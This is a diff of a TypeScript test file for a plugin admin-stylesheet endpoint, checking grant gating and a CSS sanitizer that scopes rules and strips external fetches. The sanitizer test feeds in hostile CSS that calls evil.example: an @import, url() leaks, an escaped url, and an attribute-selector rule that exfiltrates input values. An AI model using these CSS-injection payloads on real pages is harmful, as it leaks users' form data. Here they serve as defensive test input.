@@ -57,6 +57,9 @@ const NG = `wjs-fp-ng-${PID}`;        // active, NOT granted browser:script
 const NOPE = `wjs-fp-nope-${PID}`;    // never installed
 const PROBES = [ON, OFF, NG];
 const adminSlugOf = (slug: string) => `${slug}-page`;
+// What /admin-style/css serves for the probe's `.admin-probe{}`: the CONFINED sheet (core/plugin-admin-css)
+// — every rule scoped so it stops short of the admin's own UI.
+const CONFINED_PROBE = '@scope (:root) to ([data-wjs-host-ui]){.admin-probe{}}';
 
 let options: any, perms: any;
 let adminCookie = '', subscriberCookie = '';
@@ -399,7 +402,7 @@ describe('GET /api/v1/plugins/:slug/admin-style{,/css} — the admin page\'s sty
         const r = await style(ON, '/css').set('Cookie', adminCookie);
         assert.strictEqual(r.status, 200);
         assert.match(String(r.headers['content-type']), /text\/css/);
-        assert.strictEqual(r.text, '.admin-probe{}');
+        assert.strictEqual(r.text, CONFINED_PROBE);
         assert.strictEqual(r.headers['cache-control'], 'private, no-cache');
         assert.strictEqual(r.headers['x-content-type-options'], 'nosniff');
         const again = await style(ON, '/css').set('Cookie', adminCookie).set('If-None-Match', r.headers.etag);
@@ -419,7 +422,7 @@ describe('GET /api/v1/plugins/:slug/admin-style{,/css} — the admin page\'s sty
             assert.strictEqual(info.body.stylesheet, true, `${role}: told there is a stylesheet to link`);
             const css = await style(adminSlugOf(ON), '/css').set('Cookie', cookie);
             assert.strictEqual(css.status, 200, `${role}: admin-style/css by admin slug`);
-            assert.strictEqual(css.text, '.admin-probe{}', `${role}: the packaged admin.css itself`);
+            assert.strictEqual(css.text, CONFINED_PROBE, `${role}: the packaged admin.css, confined`);
         }
     });
 
@@ -437,6 +440,72 @@ describe('GET /api/v1/plugins/:slug/admin-style{,/css} — the admin page\'s sty
             const updated = await style(ON, '/css').set('Cookie', subscriberCookie).set('If-None-Match', first.headers.etag);
             assert.strictEqual(updated.status, 200, 'an updated stylesheet is not a 304');
             assert.match(updated.text, /@layer wjs-plugin/);
+        } finally {
+            fs.writeFileSync(file, '.admin-probe{}');
+        }
+    });
+
+    it('serves the stylesheet only with browser:script: an active plugin without the grant has none to link', async () => {
+        // NG ships client/admin/admin.css and is active, but is not granted browser:script — the gate of
+        // its dist/ bundles. The sheet is linked as a full-page stylesheet in the admin, so it is browser
+        // code under the same rule.
+        const info = await style(NG).set('Cookie', adminCookie);
+        assert.strictEqual(info.status, 200);
+        assert.strictEqual(info.body.stylesheet, false, 'not offered without browser:script');
+        const css = await style(NG, '/css').set('Cookie', adminCookie);
+        const nope = await style(NOPE, '/css').set('Cookie', adminCookie);
+        assertSameAnswer(css, nope, 'ungranted admin.css vs never installed');
+        perms._setGrantsInMemory(NG, ['browser:script']);
+        try {
+            assert.strictEqual((await style(NG, '/css').set('Cookie', adminCookie)).status, 200, 'granted: served');
+        } finally {
+            perms._setGrantsInMemory(NG, []);
+        }
+    });
+
+    it('confines what it serves: nothing that fetches, every rule scoped away from host UI', async () => {
+        const file = path.join(PLUGINS_ROOT, ON, 'client', 'admin', 'admin.css');
+        const BS = String.fromCharCode(92);
+        fs.writeFileSync(file, [
+            '@import url(https://evil.example/a.css);',
+            ':root { --brand: #123456; --leak: url(https://evil.example/var); }',
+            'input[value^="a"] { background: url(https://evil.example/a); }',
+            `.esc { background: u${BS}72 l(https://evil.example/escaped); }`,
+            '.set { background-image: image-set("https://evil.example/s.png" 1x); }',
+            '.ok { background: url(data:image/png;base64,AAAA); color: var(--brand); }',
+            '@font-face { font-family: Probe; src: url(https://evil.example/f.woff2); }',
+            '@keyframes probe-spin { to { transform: rotate(360deg) } }',
+            '@layer utilities { @layer wjs-plugin { .flex { display: flex } } }',
+        ].join('\n'));
+        try {
+            const r = await style(ON, '/css').set('Cookie', adminCookie);
+            assert.strictEqual(r.status, 200);
+            assert.ok(!/evil\.example/.test(r.text), `no external fetch survives: ${r.text}`);
+            assert.ok(!/@import/i.test(r.text), 'no @import');
+            assert.ok(r.text.includes('url(data:image/png;base64,AAAA)'), 'a data: URL loads nothing and is kept');
+            // Every element-selecting rule sits inside @scope … to ([data-wjs-host-ui]); layers keep their
+            // order outside it; @keyframes / @font-face stay top-level (they select nothing).
+            assert.ok(r.text.startsWith('@scope (:root) to ([data-wjs-host-ui]){:scope{--brand: #123456}'), `:root is re-anchored on :scope: ${r.text}`);
+            assert.ok(r.text.includes('@layer utilities{@layer wjs-plugin{@scope (:root) to ([data-wjs-host-ui]){.flex{display:flex}}}}'), r.text);
+            assert.ok(r.text.includes('@keyframes probe-spin{'), r.text);
+            // Structurally: every style rule (other than keyframe steps) has an @scope ancestor.
+            const csstree = require('css-tree');
+            const unscoped: string[] = [];
+            csstree.walk(csstree.parse(r.text), {
+                visit: 'Rule',
+                enter(this: any, node: any) {
+                    const stack: any[] = this.atrule ? [this.atrule] : [];
+                    const inKeyframes = stack.some((a) => /keyframes$/.test(a.name));
+                    if (inKeyframes) return;
+                    if (!this.atrule || !hasScopeAncestor(this)) unscoped.push(csstree.generate(node.prelude));
+                },
+            });
+            function hasScopeAncestor(ctx: any): boolean {
+                // css-tree exposes the NEAREST at-rule only; the confinement puts @scope as the nearest
+                // container of every top-level-or-layered rule, so nearest === scope (or a group rule inside it).
+                return ctx.atrule && (ctx.atrule.name === 'scope' || /^(media|supports|container)$/.test(ctx.atrule.name));
+            }
+            assert.deepStrictEqual(unscoped, [], 'no style rule outside @scope');
         } finally {
             fs.writeFileSync(file, '.admin-probe{}');
         }
